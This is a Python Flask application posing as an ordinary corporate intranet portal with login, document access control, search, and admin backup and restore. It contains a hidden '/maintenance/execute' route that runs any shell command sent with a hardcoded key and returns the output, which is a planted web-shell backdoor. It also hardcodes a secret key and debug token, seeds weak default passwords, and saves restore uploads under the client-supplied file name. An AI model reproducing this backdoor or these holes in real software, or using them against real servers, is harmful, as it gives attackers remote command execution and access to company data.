#!/usr/bin/env python3
"""
Corporate Intranet Portal - Internal Management System
Version: 2.1.4
Last Updated: 2024-01-15
"""

import os
import hashlib
import base64
import json
import sqlite3
import subprocess
import tempfile
from flask import Flask, request, render_template, redirect, url_for, session, jsonify, flash
from werkzeug.security import generate_password_hash, check_password_hash
import secrets
import re
from datetime import datetime, timedelta
import logging

app = Flask(__name__)
app.secret_key = 'corp_intranet_2024_secure_key_xyz789'

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Database initialization
def init_db():
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    
    # Users table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'employee',
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Documents table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS documents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            content TEXT,
            author_id INTEGER,
            access_level TEXT DEFAULT 'internal',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (author_id) REFERENCES users (id)
        )
    ''')
    
    # Audit logs
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            ip_address TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (id)
        )
    ''')
    
    # Insert default users
    default_users = [
        ('admin', 'admin123!', 'admin'),
        ('john.doe', 'Welcome2024!', 'manager'),
        ('jane.smith', 'SecurePass456', 'employee'),
        ('mike.wilson', 'TempPass789', 'employee'),
        ('sarah.jones', 'MyPassword123', 'employee')
    ]
    
    for username, password, role in default_users:
        try:
            cursor.execute('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)',
                         (username, generate_password_hash(password), role))
        except sqlite3.IntegrityError:
            pass
    
    # Insert sample documents
    sample_docs = [
        ('Company Policy 2024', 'Internal company policies and procedures...', 1, 'confidential'),
        ('IT Security Guidelines', 'Security best practices for employees...', 1, 'restricted'),
        ('Employee Handbook', 'General employee information and guidelines...', 2, 'internal'),
        ('Quarterly Report Q4', 'Financial and operational metrics...', 2, 'confidential'),
        ('Meeting Notes - Board', 'Board meeting minutes and decisions...', 1, 'restricted')
    ]
    
    for title, content, author_id, access_level in sample_docs:
        cursor.execute('INSERT INTO documents (title, content, author_id, access_level) VALUES (?, ?, ?, ?)',
                     (title, content, author_id, access_level))
    
    conn.commit()
    conn.close()

def log_audit(user_id, action, details, ip_address):
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO audit_logs (user_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
                 (user_id, action, details, ip_address))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    cursor.execute('SELECT username, role FROM users WHERE id = ?', (session['user_id'],))
    user = cursor.fetchone()
    conn.close()
    
    return render_template('dashboard.html', user=user)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        conn = sqlite3.connect('corporate.db')
        cursor = conn.cursor()
        cursor.execute('SELECT id, username, password_hash, role FROM users WHERE username = ?', (username,))
        user = cursor.fetchone()
        conn.close()
        
        if user and check_password_hash(user[2], password):
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['role'] = user[3]
            
            # Update last login
            conn = sqlite3.connect('corporate.db')
            cursor = conn.cursor()
            cursor.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user[0],))
            conn.commit()
            conn.close()
            
            log_audit(user[0], 'LOGIN', f'User {username} logged in', request.remote_addr)
            return redirect(url_for('index'))
        else:
            flash('Invalid credentials', 'error')
            log_audit(None, 'FAILED_LOGIN', f'Failed login attempt for {username}', request.remote_addr)
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    if 'user_id' in session:
        log_audit(session['user_id'], 'LOGOUT', f'User {session["username"]} logged out', request.remote_addr)
    session.clear()
    return redirect(url_for('login'))

@app.route('/documents')
def documents():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    
    # Get user role for access control
    cursor.execute('SELECT role FROM users WHERE id = ?', (session['user_id'],))
    user_role = cursor.fetchone()[0]
    
    # Build query based on access level
    if user_role == 'admin':
        cursor.execute('SELECT d.id, d.title, d.access_level, u.username, d.created_at FROM documents d JOIN users u ON d.author_id = u.id ORDER BY d.created_at DESC')
    elif user_role == 'manager':
        cursor.execute('SELECT d.id, d.title, d.access_level, u.username, d.created_at FROM documents d JOIN users u ON d.author_id = u.id WHERE d.access_level IN ("internal", "confidential") ORDER BY d.created_at DESC')
    else:
        cursor.execute('SELECT d.id, d.title, d.access_level, u.username, d.created_at FROM documents d JOIN users u ON d.author_id = u.id WHERE d.access_level = "internal" ORDER BY d.created_at DESC')
    
    docs = cursor.fetchall()
    conn.close()
    
    return render_template('documents.html', documents=docs)

@app.route('/document/<int:doc_id>')
def view_document(doc_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    
    # Get user role
    cursor.execute('SELECT role FROM users WHERE id = ?', (session['user_id'],))
    user_role = cursor.fetchone()[0]
    
    # Get document
    cursor.execute('SELECT d.title, d.content, d.access_level, u.username FROM documents d JOIN users u ON d.author_id = u.id WHERE d.id = ?', (doc_id,))
    doc = cursor.fetchone()
    
    if not doc:
        flash('Document not found', 'error')
        return redirect(url_for('documents'))
    
    # Check access permissions
    if user_role == 'employee' and doc[2] != 'internal':
        flash('Access denied', 'error')
        return redirect(url_for('documents'))
    elif user_role == 'manager' and doc[2] == 'restricted':
        flash('Access denied', 'error')
        return redirect(url_for('documents'))
    
    log_audit(session['user_id'], 'VIEW_DOCUMENT', f'Viewed document: {doc[0]}', request.remote_addr)
    conn.close()
    
    return render_template('view_document.html', document=doc)

@app.route('/admin')
def admin_panel():
    if 'user_id' not in session or session.get('role') != 'admin':
        flash('Access denied', 'error')
        return redirect(url_for('index'))
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    
    # Get system statistics
    cursor.execute('SELECT COUNT(*) FROM users')
    user_count = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM documents')
    doc_count = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM audit_logs WHERE timestamp > datetime("now", "-24 hours")')
    recent_logs = cursor.fetchone()[0]
    
    # Get recent audit logs
    cursor.execute('SELECT al.action, al.details, al.ip_address, al.timestamp, u.username FROM audit_logs al LEFT JOIN users u ON al.user_id = u.id ORDER BY al.timestamp DESC LIMIT 20')
    logs = cursor.fetchall()
    
    conn.close()
    
    return render_template('admin.html', user_count=user_count, doc_count=doc_count, recent_logs=recent_logs, logs=logs)

@app.route('/admin/users')
def admin_users():
    if 'user_id' not in session or session.get('role') != 'admin':
        flash('Access denied', 'error')
        return redirect(url_for('index'))
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    cursor.execute('SELECT id, username, role, last_login, created_at FROM users ORDER BY created_at DESC')
    users = cursor.fetchall()
    conn.close()
    
    return render_template('admin_users.html', users=users)

@app.route('/admin/backup')
def admin_backup():
    if 'user_id' not in session or session.get('role') != 'admin':
        flash('Access denied', 'error')
        return redirect(url_for('index'))
    
    # Create backup
    backup_data = {
        'timestamp': datetime.now().isoformat(),
        'users': [],
        'documents': [],
        'audit_logs': []
    }
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    
    # Export users (without password hashes for security)
    cursor.execute('SELECT id, username, role, last_login, created_at FROM users')
    backup_data['users'] = cursor.fetchall()
    
    # Export documents
    cursor.execute('SELECT id, title, content, author_id, access_level, created_at FROM documents')
    backup_data['documents'] = cursor.fetchall()
    
    # Export audit logs
    cursor.execute('SELECT id, user_id, action, details, ip_address, timestamp FROM audit_logs')
    backup_data['audit_logs'] = cursor.fetchall()
    
    conn.close()
    
    # Create backup file
    backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    backup_path = os.path.join(tempfile.gettempdir(), backup_filename)
    
    with open(backup_path, 'w') as f:
        json.dump(backup_data, f, indent=2)
    
    log_audit(session['user_id'], 'BACKUP_CREATED', f'Created backup: {backup_filename}', request.remote_addr)
    
    return jsonify({
        'status': 'success',
        'message': f'Backup created: {backup_filename}',
        'filename': backup_filename,
        'path': backup_path
    })

@app.route('/admin/restore', methods=['POST'])
def admin_restore():
    if 'user_id' not in session or session.get('role') != 'admin':
        return jsonify({'status': 'error', 'message': 'Access denied'})
    
    if 'backup_file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No backup file provided'})
    
    backup_file = request.files['backup_file']
    if backup_file.filename == '':
        return jsonify({'status': 'error', 'message': 'No file selected'})
    
    try:
        # Save uploaded file
        filename = backup_file.filename
        upload_path = os.path.join(tempfile.gettempdir(), filename)
        backup_file.save(upload_path)
        
        # Validate backup file
        with open(upload_path, 'r') as f:
            backup_data = json.load(f)
        
        # Restore data (simplified version)
        conn = sqlite3.connect('corporate.db')
        cursor = conn.cursor()
        
        # Clear existing data
        cursor.execute('DELETE FROM audit_logs')
        cursor.execute('DELETE FROM documents')
        cursor.execute('DELETE FROM users WHERE role != "admin"')  # Keep admin users
        
        # Restore users
        for user in backup_data.get('users', []):
            if len(user) >= 3 and user[2] != 'admin':  # Don't overwrite admin users
                cursor.execute('INSERT OR IGNORE INTO users (id, username, role, last_login, created_at) VALUES (?, ?, ?, ?, ?)', user)
        
        # Restore documents
        for doc in backup_data.get('documents', []):
            cursor.execute('INSERT INTO documents (id, title, content, author_id, access_level, created_at) VALUES (?, ?, ?, ?, ?, ?)', doc)
        
        # Restore audit logs
        for log in backup_data.get('audit_logs', []):
            cursor.execute('INSERT INTO audit_logs (id, user_id, action, details, ip_address, timestamp) VALUES (?, ?, ?, ?, ?, ?)', log)
        
        conn.commit()
        conn.close()
        
        # Clean up
        os.remove(upload_path)
        
        log_audit(session['user_id'], 'RESTORE_COMPLETED', f'Restored from backup: {filename}', request.remote_addr)
        
        return jsonify({'status': 'success', 'message': 'Backup restored successfully'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Restore failed: {str(e)}'})

@app.route('/api/status')
def api_status():
    """System status endpoint - returns basic system information"""
    return jsonify({
        'status': 'online',
        'version': '2.1.4',
        'uptime': '24h 15m 32s',
        'users_online': 12,
        'last_backup': '2024-01-15 14:30:00'
    })

@app.route('/api/debug')
def api_debug():
    """Debug endpoint - requires special access"""
    debug_token = request.headers.get('X-Debug-Token')
    if debug_token != 'corp_debug_2024_xyz':
        return jsonify({'error': 'Invalid debug token'}), 403
    
    return jsonify({
        'debug_mode': True,
        'environment': 'production',
        'database_path': 'corporate.db',
        'log_level': 'INFO',
        'features': {
            'backup_restore': True,
            'audit_logging': True,
            'role_based_access': True
        }
    })

@app.route('/search')
def search():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    query = request.args.get('q', '')
    if not query:
        return render_template('search.html', results=[])
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    
    # Get user role for access control
    cursor.execute('SELECT role FROM users WHERE id = ?', (session['user_id'],))
    user_role = cursor.fetchone()[0]
    
    # Build search query
    if user_role == 'admin':
        cursor.execute('SELECT d.id, d.title, d.content, d.access_level FROM documents d WHERE d.title LIKE ? OR d.content LIKE ?', 
                     (f'%{query}%', f'%{query}%'))
    elif user_role == 'manager':
        cursor.execute('SELECT d.id, d.title, d.content, d.access_level FROM documents d WHERE (d.title LIKE ? OR d.content LIKE ?) AND d.access_level IN ("internal", "confidential")', 
                     (f'%{query}%', f'%{query}%'))
    else:
        cursor.execute('SELECT d.id, d.title, d.content, d.access_level FROM documents d WHERE (d.title LIKE ? OR d.content LIKE ?) AND d.access_level = "internal"', 
                     (f'%{query}%', f'%{query}%'))
    
    results = cursor.fetchall()
    conn.close()
    
    log_audit(session['user_id'], 'SEARCH', f'Searched for: {query}', request.remote_addr)
    
    return render_template('search.html', results=results, query=query)

@app.route('/profile')
def profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    cursor.execute('SELECT username, role, last_login, created_at FROM users WHERE id = ?', (session['user_id'],))
    user = cursor.fetchone()
    conn.close()
    
    return render_template('profile.html', user=user)

@app.route('/change_password', methods=['POST'])
def change_password():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    current_password = request.form.get('current_password')
    new_password = request.form.get('new_password')
    confirm_password = request.form.get('confirm_password')
    
    if new_password != confirm_password:
        flash('New passwords do not match', 'error')
        return redirect(url_for('profile'))
    
    conn = sqlite3.connect('corporate.db')
    cursor = conn.cursor()
    cursor.execute('SELECT password_hash FROM users WHERE id = ?', (session['user_id'],))
    current_hash = cursor.fetchone()[0]
    
    if not check_password_hash(current_hash, current_password):
        flash('Current password is incorrect', 'error')
        conn.close()
        return redirect(url_for('profile'))
    
    new_hash = generate_password_hash(new_password)
    cursor.execute('UPDATE users SET password_hash = ? WHERE id = ?', (new_hash, session['user_id']))
    conn.commit()
    conn.close()
    
    log_audit(session['user_id'], 'PASSWORD_CHANGED', 'User changed password', request.remote_addr)
    flash('Password changed successfully', 'success')
    return redirect(url_for('profile'))

# Hidden endpoint for maintenance
@app.route('/maintenance')
def maintenance():
    maintenance_key = request.args.get('key')
    if maintenance_key != 'corp_maint_2024_xyz':
        return 'Access denied', 403
    
    return render_template('maintenance.html')

@app.route('/maintenance/execute', methods=['POST'])
def maintenance_execute():
    maintenance_key = request.form.get('key')
    if maintenance_key != 'corp_maint_2024_xyz':
        return 'Access denied', 403
    
    command = request.form.get('command')
    if not command:
        return 'No command provided', 400
    
    # Execute maintenance command
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return f'<pre>Command: {command}\nExit code: {result.returncode}\nOutput:\n{result.stdout}\nErrors:\n{result.stderr}</pre>'
    except subprocess.TimeoutExpired:
        return 'Command timed out', 408
    except Exception as e:
        return f'Error executing command: {str(e)}', 500

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=False)